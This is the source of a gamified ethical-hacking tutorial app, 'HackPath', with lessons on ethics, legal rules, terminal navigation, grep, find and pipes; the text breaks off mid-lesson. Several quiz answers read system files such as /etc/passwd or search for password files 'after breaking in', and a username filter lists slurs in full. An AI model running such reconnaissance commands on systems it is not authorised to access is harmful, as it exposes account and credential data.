<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>HackPath</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üõ°Ô∏è</text></svg>">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080c14;--bg2:#0c1220;--card:#111a2e;--card2:#162038;--card3:#1c2844;
  --border:#1e2d4a;--border2:#2a3f6a;
  --green:#34d399;--greenDim:rgba(52,211,153,.12);--greenGlow:rgba(52,211,153,.25);
  --red:#f87171;--redDim:rgba(248,113,113,.12);
  --blue:#60a5fa;--blueDim:rgba(96,165,250,.12);
  --cyan:#22d3ee;--cyanDim:rgba(34,211,238,.1);
  --gold:#fbbf24;--goldDim:rgba(251,191,36,.12);
  --purple:#a78bfa;--purpleDim:rgba(167,139,250,.1);
  --text:#e8edf5;--text2:#b4bfcf;--textDim:#6b7a94;
  --accent:linear-gradient(135deg,var(--green),var(--cyan));
}
html,body{margin:0;padding:0;min-height:100vh;min-height:100dvh;background:var(--bg);color:var(--text);font-family:'Outfit',sans-serif;overflow-x:hidden;-webkit-font-smoothing:antialiased}
#root{min-height:100vh;min-height:100dvh}
.hp{min-height:100vh;min-height:100dvh;max-width:520px;margin:0 auto;padding:16px 16px 80px}
.center{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;min-height:100dvh;gap:24px;max-width:440px;margin:0 auto;padding:20px}

/* Header */
.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 0 8px}
.logo{font-family:'JetBrains Mono',monospace;font-size:1.05rem;font-weight:700;background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hdr-r{display:flex;gap:6px;align-items:center}

/* Buttons */
.btn{background:var(--accent);color:#080c14;border:none;padding:11px 22px;border-radius:10px;font-weight:700;font-size:.88rem;cursor:pointer;font-family:'Outfit',sans-serif;transition:all .15s;letter-spacing:.01em;-webkit-tap-highlight-color:transparent}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 20px var(--greenGlow)}
.btn:active{transform:scale(.97)}.btn:disabled{opacity:.35;cursor:default;transform:none;box-shadow:none}
.btn.sec{background:var(--card2);color:var(--text);border:1px solid var(--border)}
.btn.sec:hover{border-color:var(--border2);background:var(--card3)}
.btn.sm{padding:7px 14px;font-size:.8rem;border-radius:8px}.btn.full{width:100%}
.btn.icon-btn{width:36px;height:36px;padding:0;display:flex;align-items:center;justify-content:center;font-size:1rem;border-radius:10px;background:var(--card2);color:var(--text2);border:1px solid var(--border)}

/* Inputs */
.inp{background:var(--card);color:var(--text);border:1px solid var(--border);padding:12px 16px;border-radius:10px;font-size:.92rem;width:100%;font-family:'JetBrains Mono',monospace;outline:none;transition:border-color .2s}
.inp:focus{border-color:var(--green);box-shadow:0 0 0 3px var(--greenDim)}
.inp::placeholder{color:var(--textDim)}

/* Animations */
.fadeIn{animation:fadeIn .35s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
.slideUp{animation:slideUp .4s cubic-bezier(.22,.68,0,1.1)}
@keyframes slideUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
.shake{animation:shake .4s ease}
@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}
.pulse{animation:pulse .45s ease}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.06)}100%{transform:scale(1)}}
.glow{box-shadow:0 0 24px var(--greenGlow)}
.starPop{display:inline-block;animation:starPop .5s ease both}
@keyframes starPop{0%{transform:scale(0) rotate(-180deg);opacity:0}70%{transform:scale(1.3) rotate(10deg);opacity:1}100%{transform:scale(1) rotate(0deg)}}
.popIn{animation:popIn .25s cubic-bezier(.22,.68,0,1.1)}
@keyframes popIn{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}

/* Cards */
.card{background:var(--card);border-radius:14px;padding:20px;border:1px solid var(--border);transition:border-color .2s}
.teach{background:linear-gradient(135deg,var(--card),var(--card2));border-left:3px solid var(--cyan);border-color:var(--border)}
.gap{display:flex;flex-direction:column;gap:12px}

/* Options */
.opt{display:block;width:100%;text-align:left;padding:13px 18px;background:var(--card2);border:1.5px solid var(--border);border-radius:10px;color:var(--text);font-size:.9rem;cursor:pointer;margin:5px 0;transition:all .15s;font-family:'Outfit',sans-serif;-webkit-tap-highlight-color:transparent}
.opt:hover{border-color:var(--border2);background:var(--card3)}
.opt.correct{border-color:var(--green);background:var(--greenDim);color:var(--green)}
.opt.wrong{border-color:var(--red);background:var(--redDim);color:var(--red)}

/* Progress bar */
.pbar{height:6px;background:var(--card);border-radius:3px;overflow:hidden}.pfill{height:100%;border-radius:3px;transition:width .4s}
.pfill-g{background:linear-gradient(90deg,var(--green),var(--cyan))}
.pfill-b{background:linear-gradient(90deg,var(--blue),var(--purple))}

/* Map nodes */
.mnode{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.9rem;cursor:pointer;transition:all .2s;border:2.5px solid transparent;font-family:'JetBrains Mono',monospace;-webkit-tap-highlight-color:transparent}
.mnode.done{background:var(--greenDim);color:var(--green);border-color:var(--green)}
.mnode.cur{background:var(--card2);border-color:var(--green);color:var(--green);box-shadow:0 0 20px var(--greenGlow)}
.mnode.lock{background:var(--card);border-color:var(--border);color:var(--textDim);cursor:default;opacity:.4}
.mnode.cp{border-radius:12px;width:auto;min-width:50px;padding:0 10px;background:var(--goldDim);border-color:var(--gold);color:var(--gold)}
.mnode.cp.done{background:var(--greenDim);border-color:var(--green);color:var(--green)}

/* Badges */
.badge{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:6px;font-size:.72rem;font-weight:600;font-family:'JetBrains Mono',monospace}
.badge-xp{background:var(--goldDim);color:var(--gold)}
.badge-level{background:var(--cyanDim);color:var(--cyan)}

/* OS tabs */
.osbtn{padding:16px;border-radius:12px;border:2px solid var(--border);background:var(--card);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.osbtn:hover{border-color:var(--border2)}.osbtn.sel{border-color:var(--green);background:var(--greenDim)}
.ostab{padding:6px 12px;border-radius:8px;font-size:.75rem;cursor:pointer;border:1px solid var(--border);background:var(--card);color:var(--textDim);font-family:'JetBrains Mono',monospace;transition:all .15s}
.ostab.active{background:var(--greenDim);border-color:var(--green);color:var(--green)}

/* Lab */
.labterm{background:#050a0f;border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;max-height:240px;overflow-y:auto;border:1px solid #152015;box-shadow:inset 0 2px 8px rgba(0,0,0,.4)}
.labterm .p{color:var(--green)}.labterm .o{color:var(--text2);white-space:pre-wrap}.labterm .h{color:var(--gold);font-style:italic}.labterm .s{color:var(--green);font-weight:700}.labterm .f{color:var(--red)}

/* Order items */
.oi{display:flex;align-items:center;gap:8px;padding:11px 14px;background:var(--card2);border:1px solid var(--border);border-radius:10px;margin:4px 0;font-size:.85rem}
.oi button{background:var(--card);border:1px solid var(--border);color:var(--text2);width:26px;height:22px;border-radius:5px;cursor:pointer;font-size:.65rem;display:flex;align-items:center;justify-content:center}

/* Match */
.mi{padding:11px 14px;border-radius:10px;cursor:pointer;font-size:.82rem;text-align:center;transition:all .15s;background:var(--card2);border:2px solid var(--border);-webkit-tap-highlight-color:transparent}

/* Section headers */
.sec-hdr{padding:18px 0 6px;display:flex;align-items:center;gap:10px}
.sec-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.sec-info{flex:1}.sec-title{font-weight:700;font-size:.88rem}.sec-desc{font-size:.72rem;margin-top:2px}

/* Why text */
.why{font-size:.82rem;color:var(--text2);margin-top:8px;padding:10px 14px;background:var(--bg2);border-radius:8px;border-left:2px solid var(--green)}

/* Settings */
.set-group{margin-bottom:20px}
.set-label{font-size:.72rem;color:var(--textDim);text-transform:uppercase;letter-spacing:1px;font-weight:600;margin-bottom:10px}
.set-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:8px}
.set-row .left{display:flex;align-items:center;gap:10px}
.set-row .left .icon{font-size:1.1rem;width:28px;text-align:center}
.set-row .left .label{font-size:.9rem;font-weight:500}
.set-row .left .sublabel{font-size:.72rem;color:var(--textDim)}
.toggle{width:44px;height:24px;border-radius:12px;background:var(--card3);border:1px solid var(--border);cursor:pointer;position:relative;transition:all .2s;-webkit-tap-highlight-color:transparent}
.toggle.on{background:var(--green);border-color:var(--green)}
.toggle::after{content:'';position:absolute;width:18px;height:18px;border-radius:50%;background:white;top:2px;left:2px;transition:transform .2s}
.toggle.on::after{transform:translateX(20px)}
.theme-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.theme-opt{padding:14px;border-radius:12px;border:2px solid var(--border);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.theme-opt.sel{border-color:var(--green)}
.theme-dot{width:32px;height:32px;border-radius:50%;margin:0 auto 6px;border:2px solid rgba(255,255,255,.1)}
.slider-wrap{display:flex;align-items:center;gap:12px;padding:14px 16px;background:var(--card);border:1px solid var(--border);border-radius:12px}
.slider-wrap input[type=range]{flex:1;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;background:var(--card3);outline:none}
.slider-wrap input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;height:20px;border-radius:50%;background:var(--green);cursor:pointer;border:2px solid var(--bg)}
.slider-wrap input[type=range]::-moz-range-thumb{width:20px;height:20px;border-radius:50%;background:var(--green);cursor:pointer;border:2px solid var(--bg)}
.slider-val{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:32px;text-align:right}

/* Noise overlay */
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;opacity:.015;z-index:9999;
background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}

/* Bottom nav */
.bnav{position:fixed;bottom:0;left:0;right:0;background:var(--card);border-top:1px solid var(--border);display:flex;justify-content:center;gap:0;padding:6px 0 env(safe-area-inset-bottom,6px);z-index:100;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
.bnav-btn{flex:1;max-width:120px;display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px 0;color:var(--textDim);font-size:.65rem;font-weight:600;cursor:pointer;transition:color .15s;-webkit-tap-highlight-color:transparent;background:none;border:none;font-family:'Outfit',sans-serif}
.bnav-btn .ico{font-size:1.2rem}
.bnav-btn.active{color:var(--green)}
</style>
</head>
<body>
<div id="root"></div>
<script>
// === SOUNDS ===
var _ac=null,_vol=80,_sfxOn=true;
function ac(){if(!_ac)_ac=new(window.AudioContext||window.webkitAudioContext)();return _ac}
function beep(f,d,t,v){if(!_sfxOn)return;try{var c=ac(),o=c.createOscillator(),g=c.createGain();o.type=t||'sine';o.frequency.value=f;g.gain.value=(v||.15)*(_vol/100);o.connect(g);g.connect(c.destination);o.start();g.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.stop(c.currentTime+d)}catch(e){}}
var SFX={
  correct:function(){beep(523,.12);setTimeout(function(){beep(659,.12)},80);setTimeout(function(){beep(784,.15)},160)},
  wrong:function(){beep(200,.2,'sawtooth',.1);setTimeout(function(){beep(150,.25,'sawtooth',.08)},120)},
  complete:function(){beep(523,.1);setTimeout(function(){beep(659,.1)},100);setTimeout(function(){beep(784,.1)},200);setTimeout(function(){beep(1047,.2)},300)},
  tap:function(){beep(800,.05,'sine',.05)},
  levelup:function(){beep(392,.1);setTimeout(function(){beep(523,.1)},100);setTimeout(function(){beep(659,.1)},200);setTimeout(function(){beep(784,.15)},300)}
};

// === STORAGE ===
function sKey(u,k){return 'hp10-'+u+'-'+k}
function saveP(u,p){try{localStorage.setItem(sKey(u,'p'),JSON.stringify(p))}catch(e){}}
function loadP(u){try{var r=localStorage.getItem(sKey(u,'p'));return r?JSON.parse(r):{}}catch(e){return{}}}
function saveOS(u,o){try{localStorage.setItem(sKey(u,'os'),JSON.stringify(o))}catch(e){}}
function loadOS(u){try{var r=localStorage.getItem(sKey(u,'os'));return r?JSON.parse(r):null}catch(e){return null}}
function saveUser(u,p){try{localStorage.setItem(sKey(u,'a'),p)}catch(e){}}
function checkUser(u){try{return localStorage.getItem(sKey(u,'a'))}catch(e){return null}}
function saveSets(u,s){try{localStorage.setItem(sKey(u,'set'),JSON.stringify(s))}catch(e){}}
function loadSets(u){try{var r=localStorage.getItem(sKey(u,'set'));return r?JSON.parse(r):{}}catch(e){return{}}}

// === THEMES ===
var THEMES={
  dark:{name:'Midnight',bg:'#080c14',bg2:'#0c1220',card:'#111a2e',card2:'#162038',card3:'#1c2844',border:'#1e2d4a',text:'#e8edf5',textDim:'#6b7a94',dot:'#111a2e'},
  hacker:{name:'Hacker',bg:'#070f07',bg2:'#0a150a',card:'#0f1f0f',card2:'#142a14',card3:'#193519',border:'#1e4a1e',text:'#c8f0c8',textDim:'#507050',dot:'#0f1f0f'},
  light:{name:'Light',bg:'#f0f2f5',bg2:'#e8eaed',card:'#ffffff',card2:'#f5f7fa',card3:'#eef0f4',border:'#d0d5dd',text:'#1a1a2e',textDim:'#8090a0',dot:'#ffffff'},
  ocean:{name:'Ocean',bg:'#0a1628',bg2:'#0e1c32',card:'#132240',card2:'#18294a',card3:'#1e3258',border:'#243c66',text:'#e0eaf5',textDim:'#607890',dot:'#132240'}
};
function applyTheme(t){
  var th=THEMES[t]||THEMES.dark,r=document.documentElement.style;
  r.setProperty('--bg',th.bg);r.setProperty('--bg2',th.bg2);
  r.setProperty('--card',th.card);r.setProperty('--card2',th.card2);r.setProperty('--card3',th.card3);
  r.setProperty('--border',th.border);r.setProperty('--text',th.text);r.setProperty('--textDim',th.textDim);
  document.body.style.background=th.bg;
}

// === UTILS ===
function shuffle(a){var b=a.slice();for(var i=b.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=b[i];b[i]=b[j];b[j]=t}return b}
function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML}

// === USERNAME CHECK ===
var BLOCKED_EXACT=["nigger","nigga","nigg3r","n1gger","n1gga","faggot","f4ggot","fag","kike","k1ke","chink","ch1nk","spic","sp1c","wetback","gook","raghead","towelhead","coon","darkie","beaner","tranny","retard","r3tard"];
var BLOCKED_SUBSTR=["nigger","nigga","nigg3r","n1gger","n1gga"];
function checkUName(name){
  var low=name.toLowerCase().replace(/\s+/g,'');
  if(low.length<2)return'Username must be at least 2 characters';
  if(low.length>24)return'Max 24 characters';
  if(!/^[a-zA-Z0-9_.\-]+$/.test(name.trim()))return'Letters, numbers, _ . - only';
  for(var i=0;i<BLOCKED_SUBSTR.length;i++)if(low.indexOf(BLOCKED_SUBSTR[i])!==-1)return"That username isn't allowed";
  var words=low.replace(/[_.\-0-9]/g,' ').split(/\s+/);
  for(var i=0;i<words.length;i++)if(BLOCKED_EXACT.indexOf(words[i])!==-1)return"That username isn't allowed";
  return null;
}

// ============================================================
// SECTION 1: FOUNDATIONS (Beginner)
// ============================================================
var SEC1 = {
  id:"s1",title:"Foundations",tier:"beginner",icon:"\uD83D\uDEE1\uFE0F",color:"var(--green)",
  desc:"The building blocks: ethics, terminal, Linux, and networking",
  units:[
  // ---- UNIT 1: ETHICS & MINDSET ----
  {id:"u1",title:"Ethics & Mindset",desc:"What ethical hacking is, legal rules, and how to think like a pentester",levels:[
    {id:"u1l1",title:"What is Ethical Hacking?",rounds:[
      {type:"teach",text:"Ethical hacking means being paid to break into systems \u2014 legally, with permission. Imagine a bank hiring you to try to rob them so they can fix the security holes before a real criminal finds them."},
      {type:"teach",text:"Companies, governments, and hospitals all hire ethical hackers. The job title is usually Penetration Tester or Security Consultant. Average pay is $90K-$150K+ depending on experience."},
      {type:"pick",q:"Why do companies hire ethical hackers?",opts:["To find security holes before criminals do","To spy on competitors","To build websites","To install antivirus"],a:"To find security holes before criminals do",why:"Ethical hackers find and report vulnerabilities so they can be fixed."},
      {type:"tf",q:"Ethical hackers can test any system they want.",a:false,why:"You MUST have written permission before testing. Without it, it's a crime."}
    ]},
    {id:"u1l2",title:"Types of Hackers",rounds:[
      {type:"teach",text:"3 types of hackers: White Hat = good guys, hired and legal (like a locksmith testing your locks). Black Hat = criminals who break in to steal. Grey Hat = finds bugs without asking but doesn't steal \u2014 still illegal."},
      {type:"pick",q:"A locksmith hired to test a bank's locks is most like a:",opts:["White Hat","Black Hat","Grey Hat","Script Kiddie"],a:"White Hat",why:"White Hats have legal permission to test security."},
      {type:"teach",text:"Script Kiddies use tools without understanding how they work. Red Teams simulate real attackers. Blue Teams defend. Purple Teams combine both to improve security together."},
      {type:"match",q:"Match the hacker type:",pairs:[["White Hat","Legal, hired"],["Black Hat","Criminal"],["Grey Hat","No permission, no theft"],["Red Team","Simulates attackers"]],why:"Each plays a different role in cybersecurity."},
    ]},
    {id:"u1l3",title:"Legal Rules",rounds:[
      {type:"teach",text:"Before hacking anything, you need paperwork. Three key documents: Scope = which systems you can test. ROE (Rules of Engagement) = what tools and methods are allowed. NDA = you keep everything you find secret."},
      {type:"pick",q:"Which document says which servers you can test?",opts:["Scope agreement","NDA","Resume","Bug report"],a:"Scope agreement",why:"The scope lists exactly which IPs, domains, and systems are fair game."},
      {type:"teach",text:"Breaking the rules can mean prison time. The Computer Fraud and Abuse Act (CFAA) in the US makes unauthorized access a federal crime. Even scanning a network without permission can get you in trouble."},
      {type:"tf",q:"Scanning a company's network without their permission is legal if you don't damage anything.",a:false,why:"Unauthorized access is illegal regardless of whether damage occurs."},
      {type:"pick",q:"NDA stands for:",opts:["Non-Disclosure Agreement","Network Defense Authorization","No Data Access","New Device Audit"],a:"Non-Disclosure Agreement",why:"NDA means you keep all findings confidential."},
    ]},
    {id:"u1l4",title:"The 5 Phases",rounds:[
      {type:"teach",text:"Every hack follows 5 steps \u2014 think of breaking into a castle: 1) Recon = scout from a distance. 2) Scanning = check every door and window. 3) Exploitation = pick the weakest lock. 4) Post-Exploitation = find the treasure room. 5) Reporting = write down how you got in."},
      {type:"order",q:"Put the 5 pentest phases in order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"Always follow this order. Never exploit before you scan."},
      {type:"teach",text:"Recon has two types: Passive = watching from a distance (Googling, social media \u2014 they don't know you're looking). Active = knocking on doors (port scans \u2014 they might notice)."},
      {type:"pick",q:"Googling a target's employees is what kind of recon?",opts:["Passive","Active","Exploitation","Scanning"],a:"Passive",why:"Passive recon never touches the target directly."},
      {type:"tf",q:"Reporting is the last and most important phase for getting paid.",a:true,why:"If you can't clearly explain what you found, the client can't fix it and you might not get paid."},
    ]},
    // CHECKPOINT
    {id:"u1cp",title:"\uD83C\uDFC6 Ethics Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"What must you have BEFORE testing a system?",opts:["Written permission","A VPN","Kali Linux","A degree"],a:"Written permission",why:"No permission = illegal, period."},
      {type:"tf",q:"Grey Hat hackers have permission to test systems.",a:false,why:"Grey Hats act without permission, even if their intentions aren't malicious."},
      {type:"order",q:"Pentest phases in order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"This methodology keeps you organized and legal."},
      {type:"pick",q:"Which recon type can the target detect?",opts:["Active","Passive","Both","Neither"],a:"Active",why:"Active recon (scanning) touches the target directly and can be logged."},
      {type:"match",q:"Match the document to its purpose:",pairs:[["Scope","Which systems to test"],["ROE","Allowed methods"],["NDA","Keep findings secret"]],why:"All three must be in writing before you start."},
    ]},
  ]},

  // ---- UNIT 2: TERMINAL BASICS ----
  {id:"u2",title:"Terminal Basics",desc:"Your hacking cockpit \u2014 navigating the command line",levels:[
    {id:"u2l1",title:"What is the Terminal?",rounds:[
      {type:"teach",text:"The terminal is your hacking cockpit. Instead of clicking buttons, you type commands \u2014 like texting your computer. It's faster, more powerful, and most hacking tools only work here."},
      {type:"teach",text:"To open a terminal: On Linux, press Ctrl+Alt+T. On Mac, open Terminal from Applications. On Windows, use PowerShell or install WSL (Windows Subsystem for Linux)."},
      {type:"pick",q:"Why do hackers prefer the terminal over clicking?",opts:["It's faster and more powerful","It looks cool","It's easier to learn","The mouse is broken"],a:"It's faster and more powerful",why:"The terminal lets you chain commands, automate tasks, and use tools that have no GUI."},
      {type:"tf",q:"Most hacking tools have a graphical interface you can click through.",a:false,why:"Most security tools are command-line only. Learning the terminal is non-negotiable."},
    ]},
    {id:"u2l2",title:"Where Am I?",rounds:[
      {type:"teach",text:"pwd (Print Working Directory) = Where am I right now? It shows your current folder. Example: /home/kali means you're in the kali user's home folder."},
      {type:"type",q:"Show your current directory:",a:["pwd"],why:"pwd tells you exactly where you are in the filesystem."},
      {type:"teach",text:"ls = What's here? Lists files and folders. ls -la shows EVERYTHING including hidden files (starting with .) and details like permissions and sizes."},
      {type:"type",q:"List all files including hidden ones with details:",a:["ls -la","ls -al"],why:"-l = long format (details), -a = all (including hidden)."},
      {type:"pick",q:"Hidden files in Linux start with:",opts:["A dot (.)","An underscore (_)","A tilde (~)","A hash (#)"],a:"A dot (.)",why:"Files like .bashrc, .ssh, .secret are hidden from normal ls but visible with ls -a."},
    ]},
    {id:"u2l3",title:"Moving Around",rounds:[
      {type:"teach",text:"cd = Change Directory (go to a folder). cd Desktop goes into Desktop. cd .. goes up one level. cd ~ goes to your home. cd / goes to the very top (root)."},
      {type:"type",q:"Go to the Desktop folder:",a:["cd Desktop","cd ~/Desktop"],why:"cd followed by a folder name moves you into it."},
      {type:"type",q:"Go up one directory:",a:["cd .."],why:".. always means the parent directory."},
      {type:"teach",text:"Tab completion is your best friend. Start typing a folder name and press Tab \u2014 the terminal fills in the rest. Double-Tab shows all matches. This saves massive time."},
      {type:"type",q:"Go to your home directory:",a:["cd ~","cd","cd $HOME"],why:"~ is a shortcut for your home directory. cd alone also works."},
    ]},
    {id:"u2l4",title:"Creating & Deleting",rounds:[
      {type:"teach",text:"touch filename = create an empty file. mkdir dirname = create a folder. These are like right-click > New File and right-click > New Folder but faster."},
      {type:"type",q:"Create an empty file called notes.txt:",a:["touch notes.txt"],why:"touch creates empty files (or updates timestamps on existing ones)."},
      {type:"type",q:"Create a new folder called projects:",a:["mkdir projects"],why:"mkdir = make directory."},
      {type:"teach",text:"rm filename = delete a file (no trash can, gone forever!). rm -r dirname = delete a folder and everything inside it. BE CAREFUL with rm \u2014 there's no undo."},
      {type:"type",q:"Delete a file called old.txt:",a:["rm old.txt"],why:"rm removes files permanently. No recycle bin."},
      {type:"tf",q:"Deleted files with rm can be recovered from the trash.",a:false,why:"rm permanently deletes files. There is no trash can in the terminal."},
    ]},
    {id:"u2l5",title:"Copying & Moving",rounds:[
      {type:"teach",text:"cp = copy files. cp file.txt backup.txt makes a copy. cp -r folder/ backup/ copies a whole folder. mv = move OR rename. mv old.txt new.txt renames it. mv file.txt /tmp/ moves it."},
      {type:"type",q:"Copy report.txt to backup.txt:",a:["cp report.txt backup.txt"],why:"cp source destination creates a copy."},
      {type:"type",q:"Rename data.csv to results.csv:",a:["mv data.csv results.csv"],why:"mv with two filenames in the same directory = rename."},
      {type:"pick",q:"What does mv file.txt /tmp/ do?",opts:["Moves the file to /tmp/","Copies it to /tmp/","Deletes it","Renames it to /tmp/"],a:"Moves the file to /tmp/",why:"mv to a directory path moves the file there."},
    ]},
    // CHECKPOINT
    {id:"u2cp",title:"\uD83C\uDFC6 Terminal Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Show your current location:",a:["pwd"],why:"pwd = print working directory."},
      {type:"type",q:"List everything including hidden files:",a:["ls -la","ls -al"],why:"-l for details, -a for hidden files."},
      {type:"type",q:"Go up one directory:",a:["cd .."],why:".. = parent directory."},
      {type:"type",q:"Create a folder called scans:",a:["mkdir scans"],why:"mkdir creates directories."},
      {type:"type",q:"Delete a file called temp.log:",a:["rm temp.log"],why:"rm removes files permanently."},
      {type:"pick",q:"Which command renames a file?",opts:["mv","cp","rn","rename"],a:"mv",why:"mv with two filenames in the same place = rename."},
    ]},
  ]},

  // ---- UNIT 3: READING FILES ----
  {id:"u3",title:"Reading Files",desc:"View, search, and filter file contents",levels:[
    {id:"u3l1",title:"Viewing Files",rounds:[
      {type:"teach",text:"cat filename = dump the entire file to screen. Good for short files. less filename = scrollable viewer for long files (press q to quit, / to search). head and tail show the first or last 10 lines."},
      {type:"type",q:"Display the contents of secret.txt:",a:["cat secret.txt"],why:"cat reads and displays file contents."},
      {type:"type",q:"View a long log file with scrolling:",a:["less access.log","less /var/log/access.log"],why:"less lets you scroll up/down and search. Press q to quit."},
      {type:"type",q:"Show the last 10 lines of a log:",a:["tail access.log","tail /var/log/syslog"],why:"tail shows the end of a file \u2014 useful for checking recent log entries."},
    ]},
    {id:"u3l2",title:"Searching with grep",rounds:[
      {type:"teach",text:"grep = search inside files for text. Think of it as Ctrl+F for the terminal. grep 'password' file.txt finds every line containing 'password'. Add -i for case-insensitive, -r to search all files in a folder."},
      {type:"type",q:"Search for the word 'error' in log.txt:",a:["grep 'error' log.txt","grep error log.txt","grep \"error\" log.txt"],why:"grep finds lines matching your search term."},
      {type:"type",q:"Search all files in a folder for 'admin':",a:["grep -r 'admin' .","grep -r admin .","grep -ri admin ."],why:"-r searches recursively through all files and subfolders."},
      {type:"teach",text:"grep is one of the most important commands in hacking. You'll use it to search password files, log files, config files, source code \u2014 anything text-based. Master this one."},
      {type:"pick",q:"grep -i means:",opts:["Case-insensitive search","Search by line number","Invert match","Search in images"],a:"Case-insensitive search",why:"-i matches 'Error', 'ERROR', 'error' \u2014 all of them."},
    ]},
    {id:"u3l3",title:"Finding Files",rounds:[
      {type:"teach",text:"find = search for files by name, type, or size. find / -name secret.txt searches the whole system. find . -name '*.log' finds all .log files in the current folder. This is crucial for hunting down interesting files after breaking in."},
      {type:"type",q:"Find a file named passwords.txt anywhere:",a:["find / -name passwords.txt","find / -name 'passwords.txt'"],why:"find / searches from the root of the filesystem."},
      {type:"teach",text:"which and whereis tell you where a program is installed. which nmap shows /usr/bin/nmap. Useful for checking if a tool is available on a target machine."},
      {type:"type",q:"Find where nmap is installed:",a:["which nmap","whereis nmap"],why:"which shows the path to a program's binary."},
    ]},
    {id:"u3cp",title:"\uD83C\uDFC6 Reading Files Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Display contents of /etc/hostname:",a:["cat /etc/hostname"],why:"cat reads file contents."},
      {type:"type",q:"Search for 'root' in /etc/passwd:",a:["grep 'root' /etc/passwd","grep root /etc/passwd"],why:"grep searches for text patterns in files."},
      {type:"type",q:"Find all .conf files on the system:",a:["find / -name '*.conf'","find / -name *.conf"],why:"find with -name and wildcards locates files by pattern."},
      {type:"pick",q:"Which command lets you scroll through a long file?",opts:["less","cat","echo","touch"],a:"less",why:"less = scrollable file viewer. q to quit."},
    ]},
  ]},

  // ---- UNIT 4: PIPES & POWER ----
  {id:"u4",title:"Pipes & Power",desc:"Chain commands together like a pro",levels:[
    {id:"u4l1",title:"Pipes",rounds:[
      {type:"teach",text:"The pipe symbol | sends the output of one command into another. Think of it like an assembly line: one machine does its job and passes the result to the next. Example: ls | grep txt \u2014 list files, then filter for ones with 'txt' in the name."},
      {type:"type",q:"List files and filter for ones containing 'log':",a:["ls | grep log"],why:"ls lists files, | sends that list to grep which filters it."},
      {type:"teach",text:"You can chain as many pipes as you want. cat /etc/passwd | grep bash | cut -d: -f1 \u2014 this reads the user file, filters for users with bash shell, then extracts just the usernames."},
      {type:"build",q:"Build: list all users with bash shell:",parts:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],answer:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],why:"Each pipe passes output to the next command."},
    ]},
    {id:"u4l2",title:"Redirection",rounds:[
      {type:"teach",text:"> sends output to a file (overwrites it). >> appends to a file (adds to the end). Example: nmap target > results.txt saves your scan. echo 'new line' >> notes.txt adds a line without erasing."},
      {type:"pick",q:"What's the difference between > and >>?",opts:["> overwrites, >> appends","> appends, >> overwrites","Both overwrite","Both append"],a:"> overwrites, >> appends",why:"> creates/overwrites the file. >> adds to the end."},
      {type:"type",q:"Save the output of ls to files.txt:",a:["ls > files.txt"],why:"> redirects output into a file."},
    ]},
    {id:"u4l3",title:"Sorting & Counting",rounds:[
      {type:"teach",text:"sort = sort lines alphabetically. uniq = remove duplicate lines (must sort first). wc = count lines, words, or bytes. wc -l counts lines only. These are perfect for processing scan results."},
      {type:"build",q:"Build: sort file, remove duplicates, count unique lines:",parts:["sort data.txt","|","uniq","|","wc -l"],answer:["sort data.txt","|","uniq","|","wc -l"],why:"sort | uniq removes duplicates, wc -l counts what's left."},
      {type:"type",q:"Count lines in a file:",a:["wc -l file.txt","cat file.txt | wc -l"],why:"wc -l counts lines. Essential for counting scan results."},
    ]},
    {id:"u4l4",title:"Processes",rounds:[
      {type:"teach",text:"ps = show running programs. ps aux shows ALL processes. top or htop gives a live view. kill PID stops a process. kill -9 PID force kills it. You need this to manage tools during pentests."},
